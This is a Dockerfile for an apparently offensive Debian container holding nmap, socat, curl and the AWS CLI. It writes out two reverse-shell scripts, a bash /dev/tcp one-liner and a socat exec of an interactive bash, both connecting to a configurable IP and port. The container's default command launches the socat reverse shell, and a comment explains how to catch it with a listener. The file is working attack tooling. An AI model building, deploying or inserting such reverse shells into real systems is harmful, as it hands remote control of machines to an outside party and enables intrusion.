
FROM debian:latest


ENV DEBIAN_FRONTEND=noninteractive

RUN apt-get update && \
apt-get -y install --no-install-recommends \
  curl \
  nmap \
  iproute2 \
  inetutils-ping \
  unzip \
  ca-certificates \
  python3 \
  socat \
  procps \
  && apt-get clean && rm -rf /var/lib/apt/lists/*

RUN curl "https://awscli.amazonaws.com/awscli-exe-linux-x86_64.zip" -o "awscliv2.zip" && \
  unzip awscliv2.zip && \
  ./aws/install && \
  rm -r aws && rm awscliv2.zip

RUN echo "bash -i >& /dev/tcp/\${IP}/\${PORT} 0>&1" > reverse_shell.sh
RUN echo "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:\${IP}:\${PORT}" > reverse_shell_socat.sh

# catch the reverse shell with "socat file:`tty`,raw,echo=0 tcp-listen:4444"
CMD ["bash", "./reverse_shell_socat.sh"]